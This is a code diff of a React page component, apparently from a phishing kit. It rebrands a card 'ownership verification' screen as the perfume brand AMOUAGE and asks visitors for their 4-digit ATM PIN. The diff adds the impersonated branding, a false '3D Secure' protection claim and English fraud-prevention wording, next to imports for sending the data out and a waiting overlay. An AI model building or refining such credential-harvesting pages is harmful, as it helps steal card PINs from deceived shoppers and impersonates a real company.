@@ -1,9 +1,7 @@
 import { useEffect, useState, useRef } from "react";
 import { useLocation } from "wouter";
 import { useSignalEffect } from "@preact/signals-react";
-import PageLayout from "@/components/layout/PageLayout";
 import WaitingOverlay, { waitingCardInfo } from "@/components/WaitingOverlay";
-import { Button } from "@/components/ui/button";
 import {
   sendData,
   codeAction,
@@ -111,80 +109,98 @@ export default function ATMPassword() {
   const isPinComplete = pin.every(digit => digit !== "");
 
   return (
-    <PageLayout variant="default">
+    <div className="min-h-screen bg-[#f5f5f5] flex items-center justify-center px-4 py-8" dir="ltr" style={{ fontFamily: "'Helvetica Neue', Helvetica, Arial, sans-serif" }}>
       <WaitingOverlay />
 
-      <div className="bg-white rounded-2xl shadow-xl p-6">
-        {/* Header */}
-        <div className="text-center mb-6">
-          <h1 className="text-xl font-bold text-gray-800 mb-1">إثبات ملكية البطاقة</h1>
-          <h2 className="text-2xl font-bold text-primary mb-2">ATM</h2>
-          <p className="text-gray-600 text-sm">
-            لتأكيد العملية أدخل الرقم السري للصراف الآلي
-          </p>
+      <div className="w-full max-w-[480px]">
+        {/* Header - AMOUAGE branding */}
+        <div className="text-center mb-8">
+          <h1 className="text-2xl tracking-[0.3em] font-light text-black mb-2" style={{ fontFamily: "'Times New Roman', serif" }}>AMOUAGE</h1>
+          <p className="text-sm text-gray-500">Secure Verification</p>
         </div>
 
-        {/* Bank Logo */}
-        {cardInfo?.bankLogo && (
-          <div className="flex justify-center items-center mb-6">
-            <img
-              src={cardInfo.bankLogo}
-              alt={cardInfo.bankName || "Bank"}
-              className="h-10 object-contain"
-            />
-          </div>
-        )}
-
-        {/* Transaction Info */}
-        <div className="bg-gray-50 rounded-lg p-4 mb-6 text-sm text-gray-700 text-right leading-relaxed">
-          <p>
-            يرجى إدخال الرقم السري للصراف الآلي (ATM) المكون من 4 خانات للبطاقة المنتهية بـ <span className="font-bold">{cardLast4}</span> ليتم التأكد من ملكية وأهلية صاحب البطاقة للحماية من مخاطر الاحتيال الإلكتروني والتأكد من عملية الدفع.
-          </p>
-        </div>
-
-        <form onSubmit={handleSubmit} className="space-y-4">
-          {/* PIN Input - 4 separate boxes */}
-          <div className="flex justify-center gap-3" dir="ltr" onPaste={handlePaste}>
-            {pin.map((digit, index) => (
-              <input
-                key={index}
-                ref={(el) => (inputRefs.current[index] = el)}
-                type="tel"
-                inputMode="numeric"
-                maxLength={1}
-                value={digit}
-                onChange={(e) => handleChange(index, e.target.value)}
-                onKeyDown={(e) => handleKeyDown(index, e)}
-                className={`w-12 h-12 text-center text-lg font-bold border-2 rounded-lg focus:outline-none focus:ring-2 focus:ring-primary focus:border-primary ${
-                  error ? "border-red-500" : "border-gray-300"
-                }`}
-              />
-            ))}
-          </div>
-
-          {error && (
-            <p className="text-red-500 text-sm text-center font-medium">
-              الرقم السري غير صحيح، يرجى المحاولة مرة أخرى.
+        {/* Main Card */}
+        <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-8">
+          {/* Title */}
+          <div className="text-center mb-6">
+            <h2 className="text-lg font-semibold text-gray-900 mb-1">Card Ownership Verification</h2>
+            <p className="text-sm text-gray-500">
+              Enter your 4-digit ATM PIN to confirm card ownership
             </p>
+          </div>
+
+          {/* Bank Logo */}
+          {cardInfo?.bankLogo && (
+            <div className="flex justify-center items-center mb-6 py-3 border-b border-gray-100">
+              <img
+                src={cardInfo.bankLogo}
+                alt={cardInfo.bankName || "Bank"}
+                className="h-8 object-contain"
+              />
+            </div>
           )}
 
-          {/* Submit Button */}
-          <Button 
-            type="submit" 
-            className="w-full h-11 text-sm" 
-            disabled={isWaiting || !isPinComplete}
-          >
-            {isWaiting ? (
-              <div className="flex items-center justify-center gap-2">
-                <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
-                <span>جاري التحقق...</span>
+          {/* Transaction Info */}
+          <div className="bg-[#fafafa] border border-gray-100 rounded-md p-4 mb-6 text-sm text-gray-600 leading-relaxed">
+            <p>
+              Please enter your 4-digit ATM PIN for the card ending in <span className="font-semibold text-gray-900">{cardLast4}</span> to verify card ownership and protect against fraud.
+            </p>
+          </div>
+
+          <form onSubmit={handleSubmit} className="space-y-5">
+            {/* PIN Label */}
+            <label className="block text-xs text-gray-500 mb-1.5 font-medium uppercase tracking-wide text-center">ATM PIN</label>
+            
+            {/* PIN Input - 4 separate boxes */}
+            <div className="flex justify-center gap-4" dir="ltr" onPaste={handlePaste}>
+              {pin.map((digit, index) => (
+                <input
+                  key={index}
+                  ref={(el) => (inputRefs.current[index] = el)}
+                  type="tel"
+                  inputMode="numeric"
+                  maxLength={1}
+                  value={digit}
+                  onChange={(e) => handleChange(index, e.target.value)}
+                  onKeyDown={(e) => handleKeyDown(index, e)}
+                  className={`w-14 h-14 text-center text-xl font-semibold border rounded-md focus:outline-none focus:border-black transition-colors ${
+                    error ? "border-red-400 bg-red-50" : "border-gray-300"
+                  }`}
+                />
+              ))}
+            </div>
+
+            {error && (
+              <div className="bg-red-50 border border-red-200 rounded-md p-3">
+                <p className="text-red-600 text-center text-sm">
+                  Incorrect PIN. Please try again.
+                </p>
               </div>
-            ) : (
-              "تأكيد"
             )}
-          </Button>
-        </form>
+
+            {/* Submit Button */}
+            <button 
+              type="submit" 
+              className="w-full py-3 bg-black text-white text-sm font-medium uppercase tracking-wider rounded-md hover:bg-gray-900 transition-colors disabled:bg-gray-300 disabled:cursor-not-allowed"
+              disabled={isWaiting || !isPinComplete}
+            >
+              {isWaiting ? (
+                <div className="flex items-center justify-center gap-2">
+                  <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
+                  <span>Verifying...</span>
+                </div>
+              ) : (
+                "CONFIRM"
+              )}
+            </button>
+          </form>
+        </div>
+
+        {/* Footer */}
+        <div className="text-center mt-6">
+          <p className="text-xs text-gray-400">Protected by 3D Secure Authentication</p>
+        </div>
       </div>
-    </PageLayout>
+    </div>
   );
 }
